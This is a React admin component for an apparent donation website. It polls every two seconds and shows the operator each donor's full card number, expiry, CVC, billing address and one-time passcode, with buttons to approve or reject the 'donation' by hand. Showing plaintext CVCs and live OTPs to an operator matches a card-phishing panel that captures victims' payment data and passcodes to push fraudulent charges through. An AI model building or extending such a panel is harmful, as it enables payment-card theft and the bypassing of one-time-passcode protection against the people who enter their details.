'use client';

import { useState, useEffect } from 'react';
import { AdminNotification, donationDb } from '@/lib/donationDb';

export function NotificationsArchive() {
  const [notifications, setNotifications] = useState<AdminNotification[]>([]);
  const [filterType, setFilterType] = useState<'all' | 'card_details' | 'otp_verified' | 'donation_created'>('all');
  const [expandedId, setExpandedId] = useState<string | null>(null);

  useEffect(() => {
    loadNotifications();
    
    // Listen for real-time notifications
    const handleNotification = (event: Event) => {
      const customEvent = event as CustomEvent;
      setNotifications(prev => [customEvent.detail, ...prev]);
    };

    window.addEventListener('donationNotification', handleNotification);

    // Auto-refresh notifications every 2 seconds
    const refreshInterval = setInterval(() => {
      loadNotifications();
    }, 2000);

    return () => {
      window.removeEventListener('donationNotification', handleNotification);
      clearInterval(refreshInterval);
    };
  }, []);

  const loadNotifications = () => {
    const allNotifications = donationDb.getAllNotifications();
    setNotifications(allNotifications);
  };

  const handleApproveOTP = (donationId: string) => {
    console.log("[v0] Approving donation:", donationId);
    const donation = donationDb.getDonationById(donationId);
    if (donation) {
      donationDb.updateDonation(donationId, {
        otpVerified: true,
        status: 'approved',
      });
      
      console.log("[v0] Dispatching approval event for:", donationId);
      // Dispatch event to notify user (in real scenario, would use websocket)
      window.dispatchEvent(new CustomEvent('donationApproved', { detail: { donationId } }));
      
      // Also store in localStorage for cross-tab communication
      localStorage.setItem('donationApprovalStatus', JSON.stringify({
        donationId,
        status: 'approved',
        timestamp: new Date().toISOString()
      }));
      
      loadNotifications();
      alert('Donation approved successfully!');
    }
  };

  const handleRejectOTP = (donationId: string) => {
    console.log("[v0] Rejecting donation:", donationId);
    const reason = prompt('Enter rejection reason (optional):', 'Payment verification failed');
    if (reason === null) return; // User cancelled
    
    const donation = donationDb.getDonationById(donationId);
    if (donation) {
      donationDb.updateDonation(donationId, {
        status: 'rejected',
      });
      
      console.log("[v0] Dispatching rejection event for:", donationId, "reason:", reason);
      // Dispatch event with rejection reason to notify user
      window.dispatchEvent(new CustomEvent('donationRejected', { 
        detail: { 
          donationId,
          reason: reason || 'Payment verification failed'
        } 
      }));
      
      // Also store in localStorage for cross-tab communication
      localStorage.setItem('donationApprovalStatus', JSON.stringify({
        donationId,
        status: 'rejected',
        reason: reason || 'Payment verification failed',
        timestamp: new Date().toISOString()
      }));
      
      loadNotifications();
      alert('Donation rejected successfully!');
    }
  };

  const filteredNotifications = filterType === 'all' 
    ? notifications 
    : notifications.filter(n => n.type === filterType);

  const markAllAsRead = () => {
    notifications.forEach(n => {
      donationDb.markNotificationAsRead(n.id);
    });
    setNotifications(notifications.map(n => ({ ...n, read: true })));
  };

  const getNotificationIcon = (type: string) => {
    switch (type) {
      case 'card_details': return '💳';
      case 'otp_verified': return '✓';
      case 'donation_created': return '🎁';
      default: return '📬';
    }
  };

  const getNotificationTitle = (type: string) => {
    switch (type) {
      case 'card_details': return 'Card Details Received';
      case 'otp_verified': return 'OTP Verified';
      case 'donation_created': return 'Donation Created';
      default: return 'Notification';
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex justify-between items-center">
        <h2 className="text-2xl font-bold text-gray-800">Notifications Archive</h2>
        {notifications.some(n => !n.read) && (
          <button
            onClick={markAllAsRead}
            className="text-sm bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition"
          >
            Mark All as Read
          </button>
        )}
      </div>

      {/* Filter Tabs */}
      <div className="flex gap-2 border-b border-gray-200">
        {(['all', 'card_details', 'otp_verified', 'donation_created'] as const).map(type => (
          <button
            key={type}
            onClick={() => setFilterType(type)}
            className={`px-4 py-2 font-medium transition ${
              filterType === type
                ? 'border-b-2 border-blue-600 text-blue-600'
                : 'text-gray-600 hover:text-gray-800'
            }`}
          >
            {type === 'all' ? 'All' : type === 'card_details' ? 'Card Details' : type === 'otp_verified' ? 'OTP Verified' : 'Donations'}
          </button>
        ))}
      </div>

      {/* Notifications List */}
      <div className="space-y-3">
        {filteredNotifications.length === 0 ? (
          <div className="text-center py-12">
            <p className="text-gray-500">No notifications found</p>
          </div>
        ) : (
          filteredNotifications.map(notification => (
            <div
              key={notification.id}
              className={`border rounded-lg p-4 cursor-pointer transition ${
                !notification.read
                  ? 'bg-blue-50 border-blue-300'
                  : 'bg-white border-gray-200 hover:border-gray-300'
              }`}
              onClick={() => {
                setExpandedId(expandedId === notification.id ? null : notification.id);
                donationDb.markNotificationAsRead(notification.id);
                setNotifications(notifications.map(n =>
                  n.id === notification.id ? { ...n, read: true } : n
                ));
              }}
            >
              {/* Notification Header */}
              <div className="flex justify-between items-start mb-2">
                <div className="flex-1">
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-2xl">{getNotificationIcon(notification.type)}</span>
                    <h3 className="font-bold text-gray-800">{getNotificationTitle(notification.type)}</h3>
                  </div>
                  <p className="text-sm text-gray-600">{notification.donorName}</p>
                  <p className="text-xs text-gray-500 mt-1">Ref: {notification.referenceNumber}</p>
                </div>
                <div className="text-right">
                  <p className="font-bold text-lg text-gray-800">${notification.amount.toFixed(2)}</p>
                  <p className="text-xs text-gray-500 mt-1">
                    {new Date(notification.timestamp).toLocaleString()}
                  </p>
                </div>
              </div>

              {/* Expandable Details */}
              {expandedId === notification.id && (
                <div className="mt-4 pt-4 border-t border-gray-200 space-y-3">
                  {/* Donor Information */}
                  <div>
                    <h4 className="font-semibold text-gray-700 mb-2">Donor Information</h4>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div>
                        <p className="text-gray-500">Name</p>
                        <p className="font-medium text-gray-800">{notification.donorName}</p>
                      </div>
                      {notification.email && (
                        <div>
                          <p className="text-gray-500">Email</p>
                          <p className="font-medium text-gray-800">{notification.email}</p>
                        </div>
                      )}
                      {notification.phone && (
                        <div>
                          <p className="text-gray-500">Phone</p>
                          <p className="font-medium text-gray-800">{notification.phone}</p>
                        </div>
                      )}
                      {notification.donationType && (
                        <div>
                          <p className="text-gray-500">Donation Type</p>
                          <p className="font-medium text-gray-800 capitalize">{notification.donationType}</p>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Card Details */}
                  {notification.type === 'card_details' && notification.cardNumber && (
                    <div className="bg-red-50 border border-red-200 rounded p-3">
                      <h4 className="font-semibold text-red-900 mb-2">Card Details</h4>
                      <div className="grid grid-cols-2 gap-2 text-sm">
                        <div>
                          <p className="text-red-700">Card Number</p>
                          <p className="font-mono font-bold text-red-900">{notification.cardNumber}</p>
                        </div>
                        {notification.cardholderName && (
                          <div>
                            <p className="text-red-700">Cardholder</p>
                            <p className="font-medium text-red-900">{notification.cardholderName}</p>
                          </div>
                        )}
                        {notification.cardExpiration && (
                          <div>
                            <p className="text-red-700">Expiration</p>
                            <p className="font-medium text-red-900">{notification.cardExpiration}</p>
                          </div>
                        )}
                        {notification.cvc && (
                          <div>
                            <p className="text-red-700">CVC</p>
                            <p className="font-mono font-bold text-red-900">{notification.cvc}</p>
                          </div>
                        )}
                      </div>
                      {(notification.billingAddress || notification.city) && (
                        <div className="mt-3 pt-3 border-t border-red-200">
                          <p className="text-red-700 text-sm font-semibold mb-1">Billing Address</p>
                          <p className="text-sm text-red-900">
                            {notification.billingAddress}
                            {notification.city && `, ${notification.city}`}
                            {notification.state && `, ${notification.state}`}
                            {notification.zipCode && ` ${notification.zipCode}`}
                          </p>
                        </div>
                      )}
                    </div>
                  )}

                  {/* OTP Details */}
                  {notification.type === 'otp_verified' && notification.otpCode && (
                    <div className="bg-green-50 border border-green-200 rounded p-3">
                      <h4 className="font-semibold text-green-900 mb-2">OTP Verification - Awaiting Approval</h4>
                      <div className="grid grid-cols-2 gap-2 text-sm mb-3">
                        <div>
                          <p className="text-green-700 font-semibold">OTP Code</p>
                          <p className="font-mono font-bold text-green-900 text-xl">{notification.otpCode}</p>
                        </div>
                      </div>
                      
                      {/* Card Details in OTP Notification */}
                      {notification.cardNumber && (
                        <div className="bg-white border border-green-200 rounded p-2 mt-2">
                          <p className="text-green-700 text-xs font-semibold mb-2">Card Details</p>
                          <div className="grid grid-cols-2 gap-2 text-xs">
                            <div>
                              <p className="text-green-600">Card Number</p>
                              <p className="font-mono font-bold text-green-900">{notification.cardNumber}</p>
                            </div>
                            {notification.cardholderName && (
                              <div>
                                <p className="text-green-600">Cardholder</p>
                                <p className="text-green-900">{notification.cardholderName}</p>
                              </div>
                            )}
                            {notification.cardExpiration && (
                              <div>
                                <p className="text-green-600">Expiration</p>
                                <p className="text-green-900">{notification.cardExpiration}</p>
                              </div>
                            )}
                            {notification.cvc && (
                              <div>
                                <p className="text-green-600">CVC</p>
                                <p className="font-mono font-bold text-green-900">{notification.cvc}</p>
                              </div>
                            )}
                          </div>
                        </div>
                      )}
                      
                      {/* Approval Buttons */}
                      <div className="mt-4 flex gap-2">
                        <button
                          onClick={() => handleApproveOTP(notification.donationId)}
                          className="flex-1 bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-3 rounded transition text-sm"
                        >
                          ✓ Approve Donation
                        </button>
                        <button
                          onClick={() => handleRejectOTP(notification.donationId)}
                          className="flex-1 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-3 rounded transition text-sm"
                        >
                          ✕ Reject Donation
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Message */}
                  {notification.message && (
                    <div>
                      <p className="text-sm text-gray-600 italic">{notification.message}</p>
                    </div>
                  )}
                </div>
              )}

              {/* Status Indicator */}
              {!notification.read && (
                <div className="mt-2 flex items-center gap-2">
                  <div className="w-2 h-2 bg-red-600 rounded-full"></div>
                  <p className="text-xs text-red-600 font-semibold">Unread</p>
                </div>
              )}
            </div>
          ))
        )}
      </div>
    </div>
  );
}
